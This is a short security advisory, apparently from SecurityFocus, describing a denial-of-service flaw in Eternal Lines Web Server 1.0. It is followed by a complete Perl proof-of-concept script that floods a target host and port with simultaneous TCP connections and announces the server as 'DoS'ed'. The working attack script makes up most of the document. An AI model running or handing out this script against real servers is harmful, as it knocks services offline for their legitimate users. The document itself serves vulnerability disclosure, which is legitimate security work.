source: http://www.securityfocus.com/bid/12416/info

Eternal Lines Web Server is reported prone to a remote denial of service vulnerability. It is reported that the issue presents itself when the web service handles 70 or more simultaneous connections from a remote host.

A remote attacker may exploit this vulnerability to deny service to legitimate users. 

#!/usr/bin/perl
##############################################################
#        GSS-IT Research And Security Labs                   #
##############################################################
#                                                            #
#                www.gssit.co.il                             #
#                                                            #
##############################################################
#  Eternal Lines Web Server Ver 1.0 Denial Of Service POC    #
##############################################################
 
 
  
  use Socket;
  
  $host = $ARGV[0];
  $port = $ARGV[1];
  $slp  = $ARGV[2];
  $proto = getprotobyname('tcp');
  
 
if (($#ARGV) < 2)
{
print("##########################################################\n");
print("# Eternal Lines Web Server Ver 1.0 Denial Of Service POC #\n");
print("##########################################################\n\n");
print("Use : \n\nperl $0 [Host] [Port] [Sleep] \n");
exit
}
 
print("##########################################################\n");
print("# Eternal Lines Web Server Ver 1.0 Denial Of Service POC #\n");
print("##########################################################\n");
 
 
 
for ($i=1; $i<80; $i++)
{
  socket($i, PF_INET, SOCK_STREAM, $proto ); 
  $dest = sockaddr_in ($port, inet_aton($host));
  if (!(connect($i, $dest)))
  {
   Slp();
  } 
 
}
 
print("==> Unsuccesful <==");
exit;
 
 
sub Slp
 
{
 
 print("\n\nServer $host Has Been Successfully DoS'ed\n\n");
 print("The Server Will Be Down For $slp Seconds\n\n");
 sleep ($slp);
 
 print("==> Killing Connections ...<==\n");
 for ($j=1; $j<80; $j++)
  {
   shutdown($j,2);
  }
 print ("[#] Back To Work Server Up [#] ");
 exit;
}
